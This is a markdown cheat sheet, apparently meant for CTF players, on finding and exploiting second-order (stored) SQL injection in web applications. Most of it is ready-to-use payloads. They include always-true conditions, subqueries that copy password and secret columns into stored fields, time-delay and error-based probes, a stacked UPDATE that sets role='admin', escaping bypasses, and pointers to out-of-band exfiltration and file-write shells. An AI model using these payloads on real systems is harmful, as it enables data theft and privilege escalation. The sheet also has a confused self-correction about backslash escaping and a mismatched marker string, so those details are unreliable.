# Second-order (stored) SQLi — write the payload, watch it fire later

First-order SQLi executes in the same request you send it.
Second-order is stored: the app reads a "safe" column back and
interpolates it into ANOTHER query — often admin-side, often with
higher privilege. Detection is a write-then-read loop, not a single
request.

Canonical cycle:

```text
1. WRITE:  POST /profile { name: "x' OR '1'='1" }       -> stored raw
2. READ:   GET /admin/users                            -> name lands in
            SELECT * FROM users WHERE name='x' OR '1'='1'   -- fires here
3. SIGNAL: the READ response changes — extra rows, an
           error, a delay — even though the WRITE was clean
```

---

## 1. Candidate write points — where strings persist

| Sink | Where it re-fires |
|---|---|
| `username`, `email`, `display_name` | admin user lists, profile pages, "welcome" banners |
| `comment`, `review`, `message` | rendering on the item page |
| `file name`, `upload metadata` | media listings, admin downloads |
| `address`, `billing fields` | order pages, invoices |
| `referer`, `user-agent` | analytics dashboards |
| `search terms`, `recent searches` | history widgets |
| `tags`, `categories` | tag-filtering queries |
| `avatar URL`, `homepage` | link-building in templates |
| `locale`, `timezone`, `theme` | preference queries |
| `invite code`, `coupon` | validation lookups |
| `device name`, `browser fingerprint` | session management |

Rule: anything the admin panel displays is a candidate — the
admin-side query is usually less parameterised than the user-side
one.

---

## 2. The probe — marker strings, not payloads

Write a UNIQUE marker, then watch where it lands. The first goal is
confirming the value is stored and re-read into SQL context — the
payload comes after:

```text
write:  name = "ZZZ12345"
read:   grep -r ZZ12345 in admin pages / exports / API responses
then:   name = "ZZZ'"            -> did the READ return a SQL error?
        name = "ZZZ''"           -> clean again = interpolation confirmed
        name = "ZZZ' OR '1'='1"  -> extra rows or 500?
        name = "ZZZ'||'X'"       -> concat round-trip = interpolating
```

Marker alphabet soup — each variant names the quoting context the
stored value lands in:

```text
ZZZ'                -> error → single-quoted
ZZZ"                -> error → double-quoted
ZZZ`                -> error → MySQL identifier
ZZZ\)               -> error → inside parens
ZZZ';               -> error → statement boundary — stacked ok
ZZZ'--              -> clean  → lands at end of string literal
ZZZ' OR '1'='1      -> extra rows → string SQLi confirmed
ZZZ' OR (1=1)-- -   -> same via parens
```

If the read-time query is `WHERE name='ZZZ'`, then `ZZZ' OR '1'='1`
makes the WHERE always-true → ALL users listed. On an admin panel
that's the flag-adjacent answer.

---

## 3. Read sites — where the second-order effect shows

- Admin dashboards (`/admin`, `/staff`, `/moderator`)
- The same profile page in a different role (impersonation)
- Search results / "users matching"
- Emails / notifications the app sends you
- Exported reports / CSV / PDF
- Logs or "recent activity" feeds
- The value rendered in YOUR OWN profile (self-serve read)

In CTF, the admin panel is usually protected or bot-rendered — the
read happens through `report` endpoints or after a delay. Treat the
lag as expected: write, then poll the read site.

---

## 4. Payload families for the write side

```sql
-- make the second-order query TRUE
x' OR '1'='1
x' OR '1'='1'--
x')) OR (('1'='1
x' OR id=1 OR '1'='

-- extract data into the stored string (the readback IS extraction):
x'||(SELECT password FROM users LIMIT 1)||'
x'||(SELECT flag FROM secrets LIMIT 1)||'
x'||(SELECT sqlite_version())||'

-- time-delay on READ (admin page slow → confirmed even if you
-- can't see it):
x'||(SELECT CASE WHEN 1=1 THEN randomblob(1e8) ELSE '' END)||'   -- SQLite
x'||(SELECT SLEEP(3))||'                                          -- MySQL (inside fn arg)

-- error echo on READ (only if the consumer surfaces errors):
x'||extractvalue(1,concat(0x7e,(SELECT @@version)))||'

-- multiple statements if the consumer stacks:
x';UPDATE users SET role='admin' WHERE name='x'--
```

Escapes the write side may apply (double-escaping is normal):

```text
app escapes ' → \' on INSERT?   send  x\' OR \'1\'=\'1
                                 → stored as  x' OR '1'='1
app strips ' entirely?          send  x' OR 1=1-- -
                                 or build via char():
                                 x'+(SELECT char(39)+...)'
```

---

## 5. The reading loop — what the admin sees

After the write fires on the READ query, possible signals:

```text
extra rows in the listing        -> ' OR '1'='1' fired
SQL error on the admin page      -> syntax worked, variant needed
different sort / empty list      -> ' ORDER BY fired
admin page slows                 -> sleep/randomblob fired
data in YOUR row changes         -> UPDATE-style consumer
new row appears                  -> INSERT-style consumer
```

Some consumers run the query inside a `LIKE '%name%'` — then the
payload needs `%` on both sides:

```sql
x%' OR '1'='1
x%' OR '1'='1' OR name LIKE '%
```

Some consumers wrap in parens `WHERE (name='x')`:

```sql
x') OR ('1'='1
x') OR id>0 OR ('x'='y
```

---

## 6. Privilege escalation via stored payload

The second-order query usually runs with DB privileges ≥ yours —
and often as the admin's connection. If you can't SEE the result
(admin-only page), exfil channels still apply:

- The stored value becomes your carrier: `x'||(SELECT secret)||'`
  puts the secret in YOUR profile when the admin list is rendered
  and then YOUR row is re-rendered later.
- DNS OOB: `x'||load_extension(...)||'` — SQLite; `\\host\x` UNC —
  MSSQL; all documented in `oob.md`.
- Side-channel: the admin page render time = time-blind oracle.
- Error message the admin sees and forwards: error-based echo.

---

## 7. Triggering the read on a schedule

Some stored values only fire on cron/report jobs:

```text
nightly report generation        -> write tonight, error tomorrow
"recalculate stats" button       -> admin clicks = read fires
password reset on the user       -> the user's row gets re-read
"search users" admin form        -> instant read
data export                      -> the whole table scanned
```

In CTF: look for a `report`/`notify`/`remind` endpoint — the classic
trigger — and for a `bot` that visits/renders your content.

---

## 8. Defeating the "it's escaped" wall

Write-side escaping is often sloppy because the app trusts itself:

- Escapes `'` but not `\` → `x\\' OR '1'='1` stores `x\' OR '1'='1`
  where the `\` escapes the FIRST quote... wait — in MySQL `\'`
  inside `'x\''` IS escaped; what you want is `x\\'` = literal `\`
  + quote closes. Send `x\\' OR '1'='1` (literal backslash+quote
  pair: `\\` escapes the backslash leaving `'` live).
- Escapes only on INSERT, not on UPDATE → edit the profile field
  again.
- Escapes the display field but not a hidden one (slug, normalized
  email lowercase copy) → `Name.Name` vs `Name_Lower` — inject the
  derived column.
- Double-escape applied twice = raw quote stored.
- `addslashes`-only (PHP) → GBK `%bf%27` trick (`waf-evasion.md` §10).

---

## 9. Latent / delayed detection

The read may be minutes later. Signal-gathering discipline:

- Write the marker, timestamp it, then keep polling the read site.
- Use a UNIQUE string per payload — never reuse; otherwise you
  can't tell which variant landed.
- Store the write request verbatim — you'll need the exact syntax
  that stored cleanly.
- On the read side, look for CHANGED bytes not identical payloads
  — the app often strips `'` on display but keeps it in the query.

---

## 10. The falsifier

Stored-SQli is falsified when the same marker written and later
read produces IDENTICAL results for both `x' OR '1'='1` and
`x' OR '1'='2` (the two boolean forms) — a genuine consumer can't
produce the same rows for both. Also falsified when the stored
string is rendered verbatim with no interpolation — then it never
reached a query at all.

---

## 11. CTF checklist

```text
[ ] register/update a field the admin will read
[ ] marker string unique per write
[ ] read site identified (admin panel, report, export, email)
[ ] quote-context mapped via ZZZ' / ZZZ'' pair
[ ] boolean pair written: ' OR '1'='1' vs ' OR '1'='2'
[ ] read shows differential → boolean SQLi confirmed
[ ] extraction: write x'||(SELECT secret)||' then read YOUR row
[ ] no visible read → time via sleep/randomblob on consumer
[ ] can't see admin → OOB via load_extension/UNC/dns
[ ] write succeeded but read silent → consumer maybe LIKE-wrapped
    → try %' variants
[ ] only INSERT path → INTO OUTFILE shell (edge-contexts §12)
```
